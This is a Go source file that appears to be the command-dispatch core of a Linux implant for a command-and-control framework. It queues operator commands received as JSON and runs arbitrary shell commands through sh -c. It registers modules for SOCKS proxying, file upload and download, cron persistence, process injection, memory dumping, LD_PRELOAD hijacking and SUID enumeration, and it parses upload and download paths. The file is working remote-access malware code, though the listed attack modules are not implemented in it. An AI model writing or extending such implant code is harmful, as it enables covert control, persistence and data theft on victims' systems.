// server/docker/payloads/Linux/command_queue.go

//go:build linux
// +build linux

package main

import (
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"sync"
	"unicode"
)

// CommandQueue manages the processing of commands
type CommandQueue struct {
	mu              sync.Mutex
	commands        []Command
	cmdRegistry     map[string]CommandInterface
	cmdContext      *CommandContext
	activeDownloads map[string]*DownloadInfo
	activeJobs      map[string]JobInfo
	activeUploads   map[string]*UploadInfo
}

// NewCommandQueue creates a new command queue instance
func NewCommandQueue() *CommandQueue {
	currentDir, err := os.Getwd()
	if err != nil {
		currentDir = "."
	}

	ctx := &CommandContext{
		WorkingDir:  currentDir,
		SudoSession: nil,                     // Initialize SudoSession as nil
		SessionEnv:  make(map[string]string), // Initialize session environment map
		TokenStore:  nil,                     // Will be initialized for Windows
	}

	queue := &CommandQueue{
		commands:        make([]Command, 0),
		cmdRegistry:     make(map[string]CommandInterface),
		cmdContext:      ctx,
		activeDownloads: make(map[string]*DownloadInfo),
		activeJobs:      make(map[string]JobInfo),
		activeUploads:   make(map[string]*UploadInfo),
	}

	// Register all core commands
	queue.RegisterCommand(&CdCommand{})
	queue.RegisterCommand(&LsCommand{})
	queue.RegisterCommand(&PwdCommand{})
	queue.RegisterCommand(&DownloadCommand{})
	queue.RegisterCommand(&UploadCommand{})
	queue.RegisterCommand(&ShellCommand{})
	queue.RegisterCommand(&SocksCommand{})
	queue.RegisterCommand(&JobKillCommand{})
	queue.RegisterCommand(&ExitCommand{})
	queue.RegisterCommand(&SleepCommand{})
	queue.RegisterCommand(&RekeyCommand{})
	queue.RegisterCommand(&SudoSessionCommand{})
	queue.RegisterCommand(&EnvCommand{})
	queue.RegisterCommand(&CatCommand{})
	queue.RegisterCommand(&HashCommand{})
	queue.RegisterCommand(&HashDirCommand{})
	queue.RegisterCommand(&PSCommand{})
	queue.RegisterCommand(&RmCommand{})
	queue.RegisterCommand(&WhoamiCommand{})
	queue.RegisterCommand(&PersistenceCommand{})
	queue.RegisterCommand(&CronPersistenceCommand{})
	queue.RegisterCommand(&ProcessInjectionCommand{})
	queue.RegisterCommand(&MemoryDumpCommand{})
	queue.RegisterCommand(&CapabilityCommand{})
	queue.RegisterCommand(&SELinuxCommand{})
	queue.RegisterCommand(&SUIDEnumCommand{})
	queue.RegisterCommand(&ContainerDetectCommand{})
	queue.RegisterCommand(&LDPreloadCommand{})

	return queue
}

// RegisterCommand adds a command to the registry
func (cq *CommandQueue) RegisterCommand(cmd CommandInterface) {
	cq.cmdRegistry[cmd.Name()] = cmd
}

// Helper function to apply session environment before executing any command
func (cq *CommandQueue) applySessionEnvironment() {
	cq.cmdContext.mu.RLock()
	defer cq.cmdContext.mu.RUnlock()

	for key, value := range cq.cmdContext.SessionEnv {
		os.Setenv(key, value)
	}
}

// AddCommands parses and adds commands to the queue
func (cq *CommandQueue) AddCommands(jsonData string) error {
	//fmt.Printf("DEBUG: AddCommands received JSON: %s\n", jsonData)

	var commands []Command
	if err := json.Unmarshal([]byte(jsonData), &commands); err != nil {
		return fmt.Errorf("failed to parse commands: %v", err)
	}

	cq.mu.Lock()
	defer cq.mu.Unlock()

	cq.commands = append(cq.commands, commands...)
	//fmt.Printf("Added %d commands to queue\n", len(commands))

	/*
		// Debug: print details of each command
		for i, cmd := range commands {
			fmt.Printf("  Command %d: Type=%s, Data length=%d, Filename=%s\n",
				i, cmd.Command, len(cmd.Data), cmd.Filename)
		}
	*/
	return nil
}

// executeShellCommand executes a command through the system shell
func executeShellCommand(command string) (string, error) {
	var cmd *exec.Cmd

	if runtime.GOOS == "windows" {
		// On Windows, use cmd.exe
		cmd = exec.Command("cmd", "/c", command)
	} else {
		// On Unix-like systems, use sh
		cmd = exec.Command("sh", "-c", command)
	}

	output, err := cmd.CombinedOutput()
	return string(output), err
}

// executeExternalCommand handles execution of system commands
func (cq *CommandQueue) executeExternalCommand(cmd Command, cmdType string, args []string) (*CommandResult, error) {
	cmdPath, err := exec.LookPath(cmdType)
	if err != nil {
		return &CommandResult{
			Command:     cmd,
			Error:       fmt.Errorf("command not found: %v", err),
			ErrorString: fmt.Sprintf("command not found: %v", err),
			ExitCode:    127,
		}, nil
	}

	execCmd := exec.Command(cmdPath, args...)
	execCmd.Dir = cq.cmdContext.WorkingDir
	output, err := execCmd.CombinedOutput()

	result := &CommandResult{
		Command: cmd,
		Output:  string(output),
	}

	if err != nil {
		result.Error = err
		result.ErrorString = err.Error()
		if exitErr, ok := err.(*exec.ExitError); ok {
			result.ExitCode = exitErr.ExitCode()
		} else {
			result.ExitCode = 1
		}
	}

	return result, nil
}

// parseCommandLine properly handles quoted arguments and spaces in paths
// It supports both single and double quotes
func parseCommandLine(cmdLine string) []string {
	var args []string
	var current strings.Builder
	var inQuote rune
	var escaped bool

	runes := []rune(cmdLine)

	for i := 0; i < len(runes); i++ {
		r := runes[i]

		// Handle escape sequences
		if escaped {
			current.WriteRune(r)
			escaped = false
			continue
		}

		// Check for escape character
		if r == '\\' && i+1 < len(runes) {
			next := runes[i+1]
			// Only escape quotes and backslashes within quotes
			if inQuote != 0 && (next == '"' || next == '\'' || next == '\\') {
				escaped = true
				continue
			}
			// Otherwise, treat as regular backslash (for Windows paths)
			current.WriteRune(r)
			continue
		}

		// Handle quotes
		if inQuote != 0 {
			if r == inQuote {
				// End of quoted section
				inQuote = 0
			} else {
				current.WriteRune(r)
			}
			continue
		}

		// Start of quoted section
		if r == '"' || r == '\'' {
			inQuote = r
			continue
		}

		// Handle whitespace outside quotes
		if unicode.IsSpace(r) {
			if current.Len() > 0 {
				args = append(args, current.String())
				current.Reset()
			}
			continue
		}

		// Regular character
		current.WriteRune(r)
	}

	// Add any remaining content
	if current.Len() > 0 {
		args = append(args, current.String())
	}

	return args
}

// parseDownloadCommand specifically handles the download command
// The entire argument after "download" should be treated as a single file path
func parseDownloadCommand(cmdLine string) []string {
	// Remove any leading/trailing whitespace
	cmdLine = strings.TrimSpace(cmdLine)

	// Check if it starts with "download" (case-insensitive)
	if !strings.HasPrefix(strings.ToLower(cmdLine), "download") {
		// Not a download command, use regular parsing
		return parseCommandLine(cmdLine)
	}

	// Check if there's anything after "download"
	if len(cmdLine) <= 8 { // len("download") = 8
		return []string{"download"}
	}

	// Make sure there's a space after "download"
	if cmdLine[8] != ' ' && cmdLine[8] != '\t' {
		// Not a properly formatted download command
		return parseCommandLine(cmdLine)
	}

	// Get everything after "download " as the file path
	remainder := strings.TrimSpace(cmdLine[8:])

	if remainder == "" {
		return []string{"download"}
	}

	// For download, treat everything after "download " as the file path
	// But still respect quotes if they're used
	if (strings.HasPrefix(remainder, "\"") && strings.HasSuffix(remainder, "\"")) ||
		(strings.HasPrefix(remainder, "'") && strings.HasSuffix(remainder, "'")) {
		// Remove surrounding quotes
		remainder = remainder[1 : len(remainder)-1]
	}

	return []string{"download", remainder}
}

// parseUploadCommand specifically handles the upload command
// Upload can have 1 or 2 arguments, but we need to handle spaces in paths
func parseUploadCommand(cmdLine string) []string {
	// Remove any leading/trailing whitespace
	cmdLine = strings.TrimSpace(cmdLine)

	// Check if it starts with "upload" (case-insensitive)
	if !strings.HasPrefix(strings.ToLower(cmdLine), "upload") {
		// Not an upload command, use regular parsing
		return parseCommandLine(cmdLine)
	}

	// Check if there's anything after "upload"
	if len(cmdLine) <= 6 { // len("upload") = 6
		return []string{"upload"}
	}

	// Make sure there's a space after "upload"
	if cmdLine[6] != ' ' && cmdLine[6] != '\t' {
		// Not a properly formatted upload command
		return parseCommandLine(cmdLine)
	}

	// Get everything after "upload "
	remainder := strings.TrimSpace(cmdLine[6:])

	if remainder == "" {
		return []string{"upload"}
	}

	// For upload, we need to handle potential spaces in the path
	// Upload typically just has one argument (the remote path)
	// The client handles the local file selection

	// Check if the path is quoted
	if (strings.HasPrefix(remainder, "\"") && strings.HasSuffix(remainder, "\"")) ||
		(strings.HasPrefix(remainder, "'") && strings.HasSuffix(remainder, "'")) {
		// Remove surrounding quotes
		remainder = remainder[1 : len(remainder)-1]
	}

	// Return upload command with the full path as a single argument
	return []string{"upload", remainder}
}
